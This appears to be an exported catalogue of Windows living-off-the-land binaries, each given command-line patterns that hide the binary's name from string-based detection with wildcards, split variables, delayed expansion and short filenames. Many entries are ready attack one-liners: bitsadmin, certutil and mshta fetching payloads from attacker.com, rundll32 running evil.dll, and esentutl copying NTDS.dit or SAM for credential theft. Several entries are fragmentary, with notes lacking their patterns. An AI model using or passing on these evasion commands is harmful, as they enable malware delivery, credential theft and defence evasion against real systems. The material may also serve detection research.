PlatformNotes: zsh (default shell on macOS) has stricter glob behavior than bash. By default, zsh will error if a glob matches no files (`nomatch` error). Use `setopt NO_NOMATCH` or `noglob` prefix to suppress. Also, zsh supports extended globs with `setopt EXTENDED_GLOB`.

Name: bitsadmin
Description: Background Intelligent Transfer Service admin tool. Can download or upload files using BITS jobs, bypassing some network controls.

Patterns.Pattern: for /f %i in ('where bits*.exe') do %i /transfer job /download /priority normal http://attacker.com/p.exe C:\p.exe
forfiles /p C:\Windows\System32 /m bits*.exe /c "@file /transfer job /download /priority normal http://attacker.com/p.exe C:\p.exe"
Patterns.Notes: forfiles * mask finds bitsadmin.exe — @file expands to matched filename for execution
8.3 SFN — requires NtfsDisable8dot3NameCreation=0; BITSAD~1 is the auto-generated short name for bitsadmin.exe

Patterns.Pattern: for %i in (C:\Windows\System32\bits*.exe) do @%i /transfer job /download /priority normal http://attacker.com/p.exe C:\p.exe
Patterns.Notes: Native CMD for loop with filesystem glob — expands bits*.exe directly in System32 without where.exe

Patterns.Pattern: for /f %i in ('where /r C:\Windows bits*.exe') do %i /transfer job /download /priority normal http://attacker.com/p.exe C:\p.exe
Patterns.Notes: Recursive where search across Windows tree — finds bitsadmin.exe regardless of System32 vs SysWOW64 location

Patterns.Pattern: set a=bits& set b=admin& call %a%%b% /transfer job /download /priority normal http://attacker.com/p.exe C:\p.exe
Patterns.Notes: Binary name split across two SET variables — CALL resolves %a%%b%=bitsadmin; name never appears as literal string

Patterns.Pattern: cmd /c for /f %i in ('where bits*.exe') do %i /transfer job /download /priority normal http://attacker.com/p.exe C:\p.exe
Patterns.Notes: cmd /c wrapper adds an extra process layer — glob still resolves via where; parent process becomes cmd.exe not the caller

PlatformNotes:
CMD glob evasion requires the `for /f` + `where` pattern. BITS jobs persist across reboots by default, making bitsadmin useful for persistence too.

**8.3 SFN note**: Short filename paths (BITSAD~1.EXE) only exist when 8.3 name generation is enabled (`NtfsDisable8dot3NameCreation=0` in the registry).

Name: certutil
Description: Certificate management utility. Widely abused for base64 encoding/decoding and downloading files from the internet.

Patterns.Pattern: for /f %i in ('where c*til.exe') do %i -urlcache -split -f http://attacker.com/payload.exe C:\payload.exe
Patterns.Notes: CMD requires 'where' + for loop since glob doesn't work in command position. Star matches 'er' + 'u'
Single char wildcard in where query
Trailing star matches '.exe' and variant names
Using dir /b with glob to find binary
forfiles /m with certu* uniquely matches certutil.exe in System32 — @file expands to matched filename
8.3 short filename (SFN) — requires 8.3 name generation enabled (NtfsDisable8dot3NameCreation=0); CERTUT~1 is auto-generated for certutil.exe
Native CMD for loop with filesystem glob — expands cert*.exe directly in System32 without requiring where.exe as an intermediary

Patterns.Pattern: set a=cert& set b=util& call %a%%b% -urlcache -split -f http://attacker.com/p.exe C:\p.exe
Patterns.Notes: Binary name split across two SET variables — CALL invokes the concatenated %a%%b%=certutil; full name never appears as a literal string
Delayed variable expansion — /v:on enables !var! syntax; !x! resolves at runtime only, invisible to parse-time static analysis

Patterns.Pattern: for /f %i in ('where cert*.exe') do start "" /b %i -urlcache -split -f http://attacker.com/p.exe C:\p.exe
Patterns.Notes: start /b launches the resolved binary as a detached background process — changes parent process attribution in event logs

PlatformNotes:
**CMD does not expand glob wildcards in the command position.** Unlike bash, typing `c*rtutil` will not work directly in CMD. Instead, use:
- `for /f %i in ('where c*til.exe') do @%i [args]` — resolves via where.exe
- `for /f %i in ('dir /b C:\Windows\System32\cert*.exe') do @%i` — resolves via dir

**8.3 SFN note**: Short filename paths (CERTUT~1.EXE) require `NtfsDisable8dot3NameCreation=0` in the registry. On systems where 8.3 generation is disabled, these paths do not exist.

In batch scripts, use `%%i` instead of `%i`.

Patterns.Notes: Recursive where search across Windows tree — finds cmd.exe in System32 and SysWOW64

Patterns.Notes: Binary name split across two SET variables — CALL resolves %a%%b%.exe=cmd.exe; name never appears as a literal string
Delayed variable expansion — /v:on enables !var! syntax; !x! resolves at runtime, evading parse-time static analysis

Patterns.Pattern: for /f %i in ('where cm?.exe') do start "" /b %i /c whoami
Patterns.Notes: start /b launches resolved cmd.exe as a background process — changes parent process attribution in event logs

Name: cscript
Description: Windows Script Host console runner for JScript and VBScript. Executes script files from disk or UNC paths.

Patterns.Notes: Single char wildcard replaces 'c' — cs?ript matches cscript
dir /b glob finds cscript.exe in System32

8.3 SFN — CSCRIP~1 auto-generated for cscript.exe; requires NtfsDisable8dot3NameCreation=0
Native CMD for loop with filesystem glob — expands csc*.exe directly in System32 without where.exe

Patterns.Pattern: for /f %i in ('where /r C:\Windows csc*.exe') do %i script.vbs
Patterns.Notes: Recursive where search across Windows tree — finds cscript.exe in System32 and SysWOW64
Delayed variable expansion — /v:on enables !var! syntax; !x! resolves at runtime only, invisible to parse-time static analysis

PlatformNotes: cscript.exe runs scripts with console output. wscript.exe is the GUI counterpart. Both are commonly flagged; glob obfuscation on the binary name via `where` or `forfiles` bypasses some string-based detections.

Name: esentutl
Description: Extensible Storage Engine utility. Can copy locked or in-use files (e.g., NTDS.dit, SAM) and is used for credential access and file staging.

Patterns.Pattern: for /f %i in ('where esen*.exe') do %i /y source.edb destination.edb
for /f %i in ('where esentut?.exe') do %i /y source.edb dest.edb
for /f %i in ('where e*tl.exe') do %i /y source.edb dest.edb
for /f %i in ('dir /b C:\Windows\System32\esen*.exe') do %i /y src dest
Patterns.Notes: dir /b glob finds esentutl.exe in System32
forfiles * mask finds esentutl.exe — @file expands to matched filename
Native CMD for loop with filesystem glob — expands esen*.exe directly in System32 without where.exe

Patterns.Pattern: for /f %i in ('where /r C:\Windows\System32 esen*.exe') do %i /y source.edb dest.edb
Patterns.Notes: Recursive where search scoped to System32 — finds esentutl.exe without full path knowledge
8.3 SFN — ESENTU~1 auto-generated for esentutl.exe; requires NtfsDisable8dot3NameCreation=0

PlatformNotes: esentutl.exe can copy files that are locked by the OS (using VSS or direct ESE access). This makes it useful for extracting credential stores like `NTDS.dit` or the SAM hive. The `/y` flag copies a file, `/vss` accesses via Volume Shadow Copy. In batch scripts use `%%i` instead of `%i`.

Name: expand
Description: Expands compressed CAB archive files. Can extract payloads from CAB containers to disk.

Patterns.Pattern: for /f %i in ('where exp?nd.exe') do %i payload.cab -F:* C:\out\
Patterns.Notes: Single char wildcard replaces 'a' — uniquely matches expand.exe without hitting expr.exe

Patterns.Pattern: for /f %i in ('where e*nd.exe') do %i payload.cab -F:* C:\out\
Patterns.Notes: Star matches 'xpa' — resolves to expand.exe (both System32 and Git paths if present)

Patterns.Pattern: for /f %i in ('dir /b C:\Windows\System32\exp?nd.exe') do %i payload.cab -F:* C:\out\
Patterns.Notes: dir /b in System32 with exp?nd.exe — avoids ambiguity with expr.exe or explorer.exe that exp*.exe would match
forfiles ? mask finds expand.exe — @file expands to matched filename
Direct invocation — -F:* extracts all files from the CAB
Native CMD for loop with filesystem glob — exp?nd uniquely matches expand.exe without hitting explorer.exe

Patterns.Pattern: for /f %i in ('where /r C:\Windows\System32 exp?nd.exe') do %i payload.cab -F:* C:\out\
Patterns.Notes: Recursive where search — ? wildcard avoids matching explorer.exe or other exp*.exe files

PlatformNotes: expand.exe is a built-in Windows utility for extracting CAB files. The `-F:*` flag extracts all files. It is less monitored than certutil for file staging. In batch scripts use `%%i` instead of `%i`.

Name: extrac32
Description: CAB extraction utility bundled with Internet Explorer. Less monitored than expand.exe, can extract payloads from CAB archives.

Patterns.Pattern: for /f %i in ('where ext*32.exe') do %i /e /y payload.cab C:\out\
for /f %i in ('where extrac*.exe') do %i /e /y payload.cab C:\out\
for /f %i in ('where ext?ac32.exe') do %i /e /y payload.cab C:\out\
for /f %i in ('dir /b C:\Windows\System32\extrac*.exe') do %i /e payload.cab C:\out\
Patterns.Notes: dir /b glob finds extrac32.exe in System32
forfiles * mask finds extrac32.exe — @file expands to matched filename
8.3 SFN — EXTRAC~1 auto-generated for extrac32.exe; requires NtfsDisable8dot3NameCreation=0
Native CMD for loop with filesystem glob — expands extrac*.exe directly in System32 without where.exe

Patterns.Pattern: for /f %i in ('where /r C:\Windows\System32 extrac*.exe') do %i /e /y payload.cab C:\out\
Patterns.Notes: Recursive where search scoped to System32 — locates extrac32.exe without spelling full binary name

PlatformNotes: extrac32.exe is a legacy CAB extraction utility. The `/e` flag extracts all files. It is often overlooked in EDR rule sets compared to certutil or expand. In batch scripts use `%%i` instead of `%i`.

Name: finger
Description: Legacy user info protocol client. Can retrieve arbitrary text from an attacker-controlled finger server, enabling data exfiltration and payload staging.

Patterns.Notes: dir /b glob finds finger.exe in System32
forfiles * mask finds finger.exe — @file expands to matched filename
Direct invocation — response from attacker's finger server is printed to stdout
Native CMD for loop with filesystem glob — expands fin*.exe directly in System32 without where.exe

Patterns.Pattern: for /f %i in ('where /r C:\Windows\System32 fin*.exe') do %i user@attacker.com
Patterns.Notes: Recursive where search — fin* matches finger.exe; scoped to System32 to avoid matching other tools

PlatformNotes: finger.exe is enabled on older/misconfigured Windows systems. It queries the RFC 1288 finger protocol (TCP/79). An attacker can run a netcat listener (`nc -l -p 79`) to serve arbitrary data. The response is printed to stdout and can be captured with `for /f`. In batch scripts use `%%i` instead of `%i`.

Name: forfiles
Description: Execute a command for each file matching a wildcard mask. The /m flag accepts glob patterns, and @file expands to the matched filename — enabling indirect execution of binaries.

Patterns.Notes: * mask matches all .exe files; @file expands to each filename
Execute each .bat file in current directory via cmd
where glob resolves forfiles.exe path; nested * mask in /m for batch files
? wildcard in where query for forfiles itself
8.3 SFN — FORFIL~1 auto-generated for forfiles.exe; requires NtfsDisable8dot3NameCreation=0
Native CMD for loop with filesystem glob — resolves forfiles.exe via forf* expansion; /m *.bat then globs within the current directory
Recursive where search locates forfiles.exe; nested /m *.bat glob inside forfiles adds a second layer of wildcard resolution

PlatformNotes: forfiles is a native CMD utility. Its `/m` flag accepts standard Windows glob wildcards (`*`, `?`). The special variable `@file` expands to the matched filename (quoted), `@path` to the full path, and `@ext` to the extension. This makes forfiles a unique execution primitive that keeps the binary name out of the command line.

Name: mshta
Description: Microsoft HTML Application host. Executes HTA files or inline VBScript/JScript — commonly used for payload execution and initial access.

Patterns.Notes: Native CMD for loop with filesystem glob — ms?ta uniquely matches mshta.exe in System32

Patterns.Pattern: for /f %i in ('where /r C:\Windows ms?ta.exe') do %i http://attacker.com/payload.hta
Patterns.Notes: Recursive where search across Windows tree — finds mshta.exe in System32 and SysWOW64
forfiles ? mask finds mshta.exe — @file expands to matched filename for execution
Delayed variable expansion — /v:on enables !var! syntax; !x! resolves at runtime, evading parse-time static analysis

Patterns.Pattern: cmd /c for /f %i in ('where m*ta.exe') do %i http://attacker.com/payload.hta
Patterns.Notes: cmd /c wrapper adds an extra process layer — glob still resolves via where; parent process becomes cmd.exe not the caller

Patterns.Pattern: for /f %i in ('where mshta*') do start "" /b %i http://attacker.com/payload.hta
Patterns.Notes: start /b launches mshta.exe as a detached background process — changes parent process attribution in event logs

PlatformNotes: mshta.exe can run HTA files from local paths or URLs. Example: `mshta vbscript:Execute("CreateObject(""WScript.Shell"").Run ""cmd"":close")`. Blocked by many modern AV products but glob name obfuscation may bypass signature matching on process names.

Name: powershell.exe
Description: PowerShell executable launched from CMD. Bypasses CMD-level restrictions by delegating to PowerShell runtime.

Patterns.Pattern: for /f %i in ('where powers*') do %i -nop -w hidden -c IEX(...)

Patterns.Notes: forfiles * mask finds powershell.exe in its install directory — @file expands to matched filename
8.3 SFN — WINDOW~1 for WindowsPowerShell, POWERS~1 for powershell.exe; requires NtfsDisable8dot3NameCreation=0
Native CMD for loop with filesystem glob — expands power*.exe in the PowerShell install directory

Patterns.Pattern: for /f %i in ('where /r C:\Windows power?hell.exe') do %i -nop -c whoami
Patterns.Notes: Recursive where search across Windows tree — finds powershell.exe in WindowsPowerShell subdirectory without spelling the full path

Patterns.Pattern: set a=powers& set b=hell& call %a%%b%.exe -nop -c whoami

Name: regsvr32
Description: Registers and unregisters OLE controls. Can execute remote scriptlets (scrobj.dll) — the 'Squiblydoo' technique.

Patterns.Notes: Recursive where search across Windows tree — finds regsvr32.exe in System32 and SysWOW64

Patterns.Notes: cmd /c wrapper adds an extra process layer — glob resolves via where; parent process becomes cmd.exe not the caller

Name: replace
Description: Replaces (copies) files from a source to a destination directory. Can be used to stage payloads by copying files into target directories.

Patterns.Pattern: for /f %i in ('where replac*.exe') do %i C:\source\payload.exe C:\dest\
Patterns.Notes: replac* uniquely matches replace.exe — rep*.exe is too broad (also hits repair-bde.exe)

Patterns.Pattern: for /f %i in ('where r?place.exe') do %i C:\source\payload.exe C:\dest\
for /f %i in ('where replac?.exe') do %i C:\source\payload.exe C:\dest\
Patterns.Notes: Single char wildcard replaces last char 'e'

Patterns.Pattern: for /f %i in ('dir /b C:\Windows\System32\replac*.exe') do %i C:\src\p.exe C:\dst\
Patterns.Notes: dir /b in System32 with replac* — avoids also matching repair-bde.exe
forfiles replac* mask uniquely matches replace.exe in System32
Direct invocation — /a adds files that don't already exist in destination
Native CMD for loop with filesystem glob — replac* uniquely matches replace.exe, avoiding repair-bde.exe

Patterns.Pattern: for /f %i in ('where /r C:\Windows\System32 replac*.exe') do %i C:\source\payload.exe C:\dest\
Patterns.Notes: Recursive where search scoped to System32 — replac* uniquely matches replace.exe without hitting repair-bde.exe

PlatformNotes: replace.exe copies files from a source to a destination directory (not filename-to-filename). The `/a` flag adds files that are not already present. It is rarely monitored as a file-transfer utility. In batch scripts use `%%i` instead of `%i`.

Name: rundll32
Description: Loads and runs DLLs. Used to execute malicious DLL exports directly, bypassing application whitelisting.

Patterns.Notes: Native CMD for loop with filesystem glob — expands rundll*.exe directly in System32 without where.exe

Patterns.Pattern: for /f %i in ('where /r C:\Windows rundll*.exe') do %i evil.dll,DllMain
Patterns.Notes: Recursive where search across Windows tree — finds rundll32.exe in System32 and SysWOW64
forfiles * mask finds rundll32.exe — @file expands to matched filename for DLL execution

Patterns.Pattern: set a=rundll& set b=32& call %a%%b%.exe evil.dll,DllMain
Patterns.Notes: Binary name split across two SET variables — CALL resolves %a%%b%.exe=rundll32.exe; name never appears as a literal string

Patterns.Pattern: cmd /c for /f %i in ('where rundll*.exe') do %i evil.dll,DllMain

Name: wmic
Description: WMI command-line interface. Used for system information gathering, remote execution, process creation, and persistence.
